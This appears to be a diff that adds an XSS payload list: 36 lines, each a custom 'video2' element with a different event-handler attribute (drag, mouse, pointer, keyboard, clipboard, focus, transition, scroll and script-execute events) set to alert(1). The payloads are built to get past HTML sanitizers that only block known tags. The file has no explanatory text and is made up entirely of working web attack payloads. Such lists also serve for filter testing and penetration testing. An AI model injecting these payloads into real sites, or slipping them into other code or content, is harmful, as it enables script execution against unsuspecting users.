@@ -1,0 +1,36 @@
+<video2 contenteditable onbeforeinput=alert(1)>test
+<video2 draggable="true" ondrag="alert(1)" style=display:block>test</video2>
+<video2 draggable="true" ondragend="alert(1)" style=display:block>test</video2>
+<video2 draggable="true" ondragenter="alert(1)" style=display:block>test</video2>
+<video2 draggable="true" ondragleave="alert(1)" style=display:block>test</video2>
+<video2 draggable="true" ondragstart="alert(1)" style=display:block>test</video2>
+<video2 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></video2>
+<video2 onafterscriptexecute=alert(1)><script>1</script>
+<video2 onbeforescriptexecute=alert(1)><script>1</script>
+<video2 onblur=alert(1) id=x tabindex=1 style=display:block>test</video2><input value=clickme>
+<video2 onclick="alert(1)" style=display:block>test</video2>
+<video2 oncontextmenu="alert(1)" style=display:block>test</video2>
+<video2 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<video2 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<video2 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</video2>
+<video2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</video2><input value=clickme>
+<video2 onkeydown="alert(1)" contenteditable style=display:block>test</video2>
+<video2 onkeypress="alert(1)" contenteditable style=display:block>test</video2>
+<video2 onkeyup="alert(1)" contenteditable style=display:block>test</video2>
+<video2 onmousedown="alert(1)" style=display:block>test</video2>
+<video2 onmouseenter="alert(1)" style=display:block>test</video2>
+<video2 onmouseleave="alert(1)" style=display:block>test</video2>
+<video2 onmousemove="alert(1)" style=display:block>test</video2>
+<video2 onmouseout="alert(1)" style=display:block>test</video2>
+<video2 onmouseover="alert(1)" style=display:block>test</video2>
+<video2 onmouseup="alert(1)" style=display:block>test</video2>
+<video2 onmousewheel=alert(1) style=display:block>requires scrolling
+<video2 onpointerdown=alert(1) style=display:block>XSS</video2>
+<video2 onpointerenter=alert(1) style=display:block>XSS</video2>
+<video2 onpointerleave=alert(1) style=display:block>XSS</video2>
+<video2 onpointermove=alert(1) style=display:block>XSS</video2>
+<video2 onpointerout=alert(1) style=display:block>XSS</video2>
+<video2 onpointerover=alert(1) style=display:block>XSS</video2>
+<video2 onpointerrawupdate=alert(1) style=display:block>XSS</video2>
+<video2 onpointerup=alert(1) style=display:block>XSS</video2>
+<video2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></video2>
